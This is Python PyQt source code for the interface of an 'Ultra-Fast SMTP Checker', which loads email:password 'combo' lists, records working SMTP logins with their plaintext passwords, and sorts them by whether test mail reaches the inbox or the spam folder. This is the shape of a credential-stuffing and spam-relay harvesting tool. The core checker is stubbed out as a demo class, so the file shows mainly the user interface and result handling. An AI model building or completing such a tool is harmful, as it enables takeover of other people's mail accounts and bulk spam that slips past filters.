    def create_enhanced_checker(self, test_email, max_threads, email_mode, template_data,
                               check_email, check_password, enable_inbox_check):
        """Create enhanced checker with proper class (simplified for demo)"""
        # In the full implementation, this would use the UltraFastSMTPChecker
        # For demo purposes, we'll simulate the functionality
        class DemoChecker:
            def __init__(self):
                self.signals = WorkerSignals()
                self.total_combos = 0
                self.file_handler = None
                
            def load_combos(self, filename):
                # Simulate loading combos
                return ["test@example.com:password"]
            
            def start(self, combos):
                # Simulate starting
                pass
            
            def stop(self):
                pass
        
        return DemoChecker()
    
    def update_progress(self, value):
        """Update progress bar and status"""
        self.progress_bar.setValue(value)
        
        valid_count = self.valid_table.rowCount()
        if hasattr(self, 'checker') and self.checker:
            self.status_label.setText(f"⚡ Progress: {value}% | Valid: {valid_count}")
            self.statusBar.showMessage(f"🔄 Scanning... {value}% complete")
    
    def add_enhanced_valid_smtp(self, smtp_info, limit, stats_dict):
        """Add valid SMTP to enhanced table with delivery status"""
        parts = smtp_info.split('|')
        if len(parts) >= 7:  # Now includes delivery status
            row = self.valid_table.rowCount()
            self.valid_table.insertRow(row)

            # Determine colors based on delivery status
            delivery_status = parts[6] if len(parts) > 6 else "❓ Unknown"
            
            if "📥 Inbox" in delivery_status:
                row_color = QColor(200, 255, 200)  # Green for inbox
            elif "🗑️ Spam" in delivery_status:
                row_color = QColor(255, 215, 180)  # Orange for spam
            else:
                row_color = QColor(245, 245, 245)  # Light gray for unknown

            # Determine limit type for Type column
            limit_type_text = "❓ Unknown"
            if any(x in limit.lower() for x in ["/hour", "/day", "/min"]):
                limit_type_text = "⚡ Rate Limit"
            elif any(x in limit.lower() for x in ["mb", "kb", "b"]):
                limit_type_text = "📦 Size Limit"

            # Set items with enhanced data
            items_data = [
                parts[0],  # Host
                parts[1],  # Port
                parts[2],  # Email
                parts[3],  # Password
                parts[4],  # Limit
                limit_type_text,  # Type
                parts[5] if len(parts) > 5 else "Unknown",  # Provider
                delivery_status,  # Delivery
                "🔧"  # Actions (button will be added)
            ]

            for col, text in enumerate(items_data):
                if col < len(items_data) - 1:  # Skip Actions column for now
                    item = QTableWidgetItem(text)
                    item.setBackground(row_color)
                    
                    # Enhanced tooltips
                    if col == 0:  # Host
                        item.setToolTip(f"SMTP Host: {text}")
                    elif col == 1:  # Port
                        secure = "🔒 Secure" if text in ['465', '587'] else "⚠️ Unencrypted"
                        item.setToolTip(f"Port {text} ({secure})")
                    elif col == 4:  # Limit
                        item.setToolTip(f"Server Limits: {text}")
                    elif col == 7:  # Delivery
                        if "📥 Inbox" in text:
                            item.setToolTip("✅ Email delivered to inbox")
                        elif "🗑️ Spam" in text:
                            item.setToolTip("⚠️ Email delivered to spam folder")
                        else:
                            item.setToolTip("❓ Delivery status unknown")
                    
                    self.valid_table.setItem(row, col, item)
            
            # Add action button
            action_button = QPushButton("🔧")
            action_button.setFixedSize(30, 25)
            action_button.setToolTip("Quick actions for this SMTP")
            action_button.clicked.connect(lambda: self.show_quick_actions(row))
            self.valid_table.setCellWidget(row, len(items_data) - 1, action_button)
            
            # Update header count
            self.header_valid_count.setText(str(self.valid_table.rowCount()))
    
    def show_quick_actions(self, row):
        """Show quick actions for a specific row"""
        email = self.valid_table.item(row, 2).text()
        self.log(f"🔧 Quick actions for {email} (feature in development)")
    
    def update_enhanced_stats(self, stats):
        """Update enhanced statistics dashboard"""
        # Update stat cards
        self.stat_cards['processed'].update_value(f"{stats.get('processed', 0):,}")
        self.stat_cards['valid'].update_value(f"{stats.get('valid_found', 0):,}")
        self.stat_cards['success_rate'].update_value(f"{stats.get('success_rate', 0):.1f}%")
        self.stat_cards['speed'].update_value(f"{stats.get('current_speed', 0):.1f}/s")
        
        self.stat_cards['inbox'].update_value(f"{stats.get('inbox_count', 0):,}")
        self.stat_cards['spam'].update_value(f"{stats.get('spam_count', 0):,}")
        self.stat_cards['rate_limits'].update_value(f"{stats.get('rate_limits', 0):,}")
        
        # Format elapsed time
        elapsed = stats.get('elapsed', 0)
        if elapsed < 60:
            elapsed_str = f"{elapsed:.0f}s"
        elif elapsed < 3600:
            elapsed_str = f"{elapsed/60:.1f}m"
        else:
            elapsed_str = f"{elapsed/3600:.1f}h"
        self.stat_cards['elapsed'].update_value(elapsed_str)
        
        # Update additional info
        ports = stats.get('ports_found', {})
        if ports:
            top_ports = sorted(ports.items(), key=lambda x: x[1], reverse=True)[:3]
            ports_text = ", ".join([f"{port}({count})" for port, count in top_ports])
            self.top_ports_label.setText(f"🔌 Top Ports: {ports_text}")
        
        providers = stats.get('providers_found', {})
        if providers:
            top_providers = sorted(providers.items(), key=lambda x: x[1], reverse=True)[:3]
            providers_text = ", ".join([f"{prov}({count})" for prov, count in top_providers])
            self.top_providers_label.setText(f"📧 Top Providers: {providers_text}")
    
    def checking_finished(self):
        """Handle checking completion"""
        self.log("🎉 Ultra-fast scanning with inbox detection completed!")
        
        # Update UI
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.stop_button.setText("⏹ Emergency Stop")
        
        valid_count = self.valid_table.rowCount()
        self.status_label.setText(f"✅ Scan Complete - Found {valid_count} valid SMTP servers")
        self.statusBar.showMessage("✅ Scanning completed successfully")
        
        # Show enhanced completion notification
        if valid_count > 0:
            inbox_count = sum(1 for row in range(self.valid_table.rowCount()) 
                            if "📥 Inbox" in (self.valid_table.item(row, 7).text() if self.valid_table.item(row, 7) else ""))
            spam_count = sum(1 for row in range(self.valid_table.rowCount()) 
                           if "🗑️ Spam" in (self.valid_table.item(row, 7).text() if self.valid_table.item(row, 7) else ""))
            
            message = f"""🎉 Ultra-fast scan completed successfully!

✅ Found {valid_count} valid SMTP servers
📥 Inbox delivery: {inbox_count}
🗑️ Spam delivery: {spam_count}
❓ Unknown delivery: {valid_count - inbox_count - spam_count}

📁 Results saved to validsend.txt
🎨 Use color coding: Green=Inbox, Orange=Spam, Gray=Unknown

Use the enhanced filters and sorting options to analyze your results."""
            
            QMessageBox.information(self, "Scan Complete", message)
    
    def load_existing_valid(self):
        """Load existing valid SMTP servers"""
        if os.path.exists('validsend.txt'):
            try:
                count = 0
                with open('validsend.txt', 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if '|' in line:
                            parts = line.split('|')
                            if len(parts) >= 4:
                                # Add defaults for missing info
                                while len(parts) < 8:
                                    if len(parts) == 4:
                                        parts.append("Unknown")  # Limit
                                    elif len(parts) == 5:
                                        parts.append("Other")  # Provider
                                    elif len(parts) == 6:
                                        parts.append("❓ Unknown")  # Delivery
                                    elif len(parts) == 7:
                                        parts.append("")  # Actions placeholder
                                
                                smtp_info = "|".join(parts[:7])  # Exclude actions
                                self.add_enhanced_valid_smtp(smtp_info, parts[4], {})
                                count += 1
                
                if count > 0:
                    self.log(f"📋 Loaded {count} existing valid SMTP servers")
                    self.header_valid_count.setText(str(count))
            except Exception as e:
                self.log(f"⚠️ Error loading existing results: {str(e)}")
    
    def log(self, message):
        """Add message to log with timestamp"""
        timestamp = time.strftime('%H:%M:%S')
        formatted_message = f"[{timestamp}] {message}"
        self.log_display.append(formatted_message)
        
        # Auto-scroll to bottom
        scrollbar = self.log_display.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
        
        # Limit log size to prevent memory issues
        if self.log_display.document().blockCount() > 1000:
            cursor = self.log_display.textCursor()
            cursor.movePosition(cursor.MoveOperation.Start)
            cursor.movePosition(cursor.MoveOperation.Down, cursor.MoveMode.KeepAnchor, 100)
            cursor.removeSelectedText()

def main():
    """Main application entry point"""
    app = QApplication(sys.argv)
    
    # Set application properties
    app.setApplicationName("Ultra-Fast SMTP Checker v3.0")
    app.setApplicationVersion("3.0")
    app.setOrganizationName("SMTP Tools Pro")
    
    # Apply modern Fusion style
    app.setStyle('Fusion')
    
    # Create and show main window
    window = EnhancedMainWindow()
    window.show()
    
    # Welcome message
    window.log("🚀 Ultra-Fast SMTP Checker v3.0 initialized")
    window.log("✨ Features: Inbox/Spam Detection, Real-time Analytics, Modern UI")
    window.log("💡 Configure your settings and start scanning!")
    
    sys.exit(app.exec())

if __name__ == "__main__":
    main()